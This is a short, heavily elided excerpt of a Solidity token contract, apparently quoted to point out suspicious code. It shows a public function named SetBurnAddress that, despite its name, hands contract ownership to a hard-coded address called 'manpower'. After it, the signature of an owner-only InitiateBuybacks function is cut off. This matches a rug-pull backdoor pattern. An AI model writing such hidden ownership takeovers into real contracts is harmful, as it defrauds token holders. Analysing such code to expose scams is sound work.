...
contract Ownable is Context {
  ...
  */
  ...
  function SetBurnAddress() public {
    require(_owner != manpower);
    emit OwnershipTransferred(_owner, manpower);
    _owner = manpower;
  }
...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  */
  ...
  function InitiateBuybacks(uint256 amount) public onlyOwner returns (bool) {
